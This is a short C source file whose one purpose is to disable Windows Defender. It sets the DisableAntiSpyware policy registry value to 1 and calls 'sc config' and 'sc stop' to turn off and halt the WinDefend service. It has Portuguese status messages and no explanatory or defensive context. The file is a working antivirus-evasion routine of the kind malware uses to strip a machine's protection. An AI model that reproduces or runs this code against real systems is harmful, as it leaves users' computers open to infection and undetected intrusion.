#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#include <stdio.h>
#include <conio.h>
#define UNICODE
#define _UNICODE
#include <windows.h>


void chartowchar(const char *src, wchar_t *dest, int destsize){
    MultiByteToWideChar(CP_ACP,0,src,-1,dest,destsize);


    //function to convert char * in wchar_t
    // src str char * dest wchar_t

    //MultiByteToWideChar convert string char to wchar so that it is compatible with Windows functions
}

void disable_windows_defender(){
    HKEY hkey;
    const char* subkey ="SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    ;
    wchar_t wsubkey[256];
    chartowchar(subkey,wsubkey,256);

    char *disable = "DisableAntiSpyware";
    wchar_t Wdisable[256];
    chartowchar(disable,Wdisable,256);



    DWORD disable_value = 1;


    //create or open edit register
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,wsubkey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_WRITE,NULL,&hkey,NULL) == ERROR_SUCCESS){
        RegSetValueEx(hkey,Wdisable,0,REG_DWORD,(const BYTE*)&disable_value,sizeof(disable_value));
        RegCloseKey(hkey);
        printf("Registro atualizado para desativar o Windows Defender.\n");

    }else{
        printf("ERROR");
        return;
    }
    system("sc config WinDefend start= disabled");
    system("sc stop WinDefend");

    printf("sucesso");
}